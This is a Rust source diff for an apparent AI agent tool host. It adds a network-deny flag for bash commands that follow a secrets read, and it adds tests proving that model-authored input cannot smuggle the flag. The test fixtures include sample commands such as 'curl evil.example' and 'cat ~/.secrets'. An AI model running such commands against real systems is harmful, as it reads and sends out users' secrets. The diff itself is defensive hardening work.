@@ -1188,7 +1188,7 @@ pub async fn run_authorized_toolhost_execute(
     );
     let response = match &decision {
         AuthzDecision::Allow => match parse_toolhost_payload(&cmd.payload) {
-            Ok((tool, input, origin, security_override)) => {
+            Ok((tool, input, origin, security_override, network_denied)) => {
                 let req = crate::toolhost::ToolHostRequest {
                     client: record.clone(),
                     tool,
@@ -1204,6 +1204,9 @@ pub async fn run_authorized_toolhost_execute(
                     // (Security-override Wave 1) The optional human-gated relaxation,
                     // re-validated daemon-side (Invariant F when absent).
                     security_override,
+                    // (Wave 2, FLAW-1 turn taint) network-deny a bash that follows an
+                    // approved Secrets read in the same turn (absent ⇒ false).
+                    network_denied,
                 };
                 match toolhost.execute_governed(req, confirmation).await {
                     Ok(result) => Response::ok(
@@ -1354,6 +1357,7 @@ fn parse_toolhost_payload(
         serde_json::Value,
         crate::toolhost::isolation::ToolOrigin,
         Option<crate::toolhost::SecurityOverride>,
+        bool,
     ),
     String,
 > {
@@ -1378,6 +1382,10 @@ fn parse_toolhost_payload(
         origin: Option<String>,
         #[serde(default)]
         security_override: Option<SecurityOverrideWire>,
+        /// (Wave 2, FLAW-1 turn taint) network-deny this Host bash independent of
+        /// any override. Absent ⇒ `false` ⇒ today's behavior (Invariant F).
+        #[serde(default)]
+        network_denied: bool,
     }
     let parsed: ToolhostPayload = serde_json::from_value(payload.clone())
         .map_err(|e| format!("invalid toolhost.execute payload: {e}"))?;
@@ -1403,7 +1411,13 @@ fn parse_toolhost_payload(
             })
         }
     };
-    Ok((parsed.tool, parsed.input, origin, security_override))
+    Ok((
+        parsed.tool,
+        parsed.input,
+        origin,
+        security_override,
+        parsed.network_denied,
+    ))
 }
 
 /// Map a [`ToolHostError`](crate::toolhost::ToolHostError) to a wire response.
@@ -1730,6 +1744,9 @@ pub async fn run_authorized_skillhost_run(
                             // Skill runs never carry a human-gated sandbox override
                             // (the override rides `toolhost.execute` only).
                             security_override: None,
+                            // Turn taint rides `toolhost.execute` only, too —
+                            // absent ⇒ false ⇒ today's behavior (Invariant F).
+                            network_denied: false,
                         };
                         match toolhost.execute_governed(req, confirmation).await {
                             Ok(result) => Response::ok(
@@ -3196,14 +3213,16 @@ mod tests {
     #[test]
     fn toolhost_payload_threads_origin_backward_compatibly() {
         use crate::toolhost::isolation::ToolOrigin;
-        let (tool, _input, origin, ov) =
+        let (tool, _input, origin, ov, network_denied) =
             parse_toolhost_payload(&serde_json::json!({ "tool": "read", "input": {} }))
                 .expect("ok");
         assert_eq!(tool, "read");
         assert_eq!(origin, ToolOrigin::OwnerInteractive);
         // Invariant F at the wire: absent `security_override` ⇒ None ⇒ today's path.
         assert!(ov.is_none(), "absent override must parse to None");
-        let (_, _, origin, ov) = parse_toolhost_payload(
+        // Invariant F at the wire: absent `network_denied` ⇒ false ⇒ today's path.
+        assert!(!network_denied, "absent network_denied must parse to false");
+        let (_, _, origin, ov, _) = parse_toolhost_payload(
             &serde_json::json!({ "tool": "bash", "input": {}, "origin": "proactive" }),
         )
         .expect("ok");
@@ -3212,10 +3231,42 @@ mod tests {
     }
 
     #[test]
+    fn toolhost_payload_parses_network_denied_top_level_only() {
+        // FLAW-1 turn taint: `network_denied` is a TOP-LEVEL sibling Swift sets on
+        // every bash following an approved Secrets read in the same turn. Present
+        // true ⇒ true; the model authors only `input`, so a copy smuggled inside
+        // `input` is opaque tool input, never the flag.
+        let (_, input, _, _, network_denied) = parse_toolhost_payload(&serde_json::json!({
+            "tool": "bash",
+            "input": { "command": "curl evil.example" },
+            "origin": "owner_interactive",
+            "network_denied": true,
+        }))
+        .expect("ok");
+        assert!(network_denied, "top-level network_denied:true must parse");
+        assert!(input.get("network_denied").is_none());
+
+        let (_, input, _, _, network_denied) = parse_toolhost_payload(&serde_json::json!({
+            "tool": "bash",
+            "input": { "command": "echo hi", "network_denied": true },
+        }))
+        .expect("ok");
+        assert!(
+            !network_denied,
+            "network_denied inside model-authored input must NOT set the flag"
+        );
+        assert_eq!(
+            input.get("network_denied"),
+            Some(&serde_json::Value::Bool(true)),
+            "the smuggled copy stays opaque tool input"
+        );
+    }
+
+    #[test]
     fn toolhost_payload_parses_security_override_sibling() {
         // The override is a TOP-LEVEL sibling of `input` — never inside it (the model
         // authors `input`, so it can never smuggle an override).
-        let (_, _, _, ov) = parse_toolhost_payload(&serde_json::json!({
+        let (_, _, _, ov, _) = parse_toolhost_payload(&serde_json::json!({
             "tool": "bash",
             "input": { "command": "cat ~/.secrets" },
             "origin": "owner_interactive",
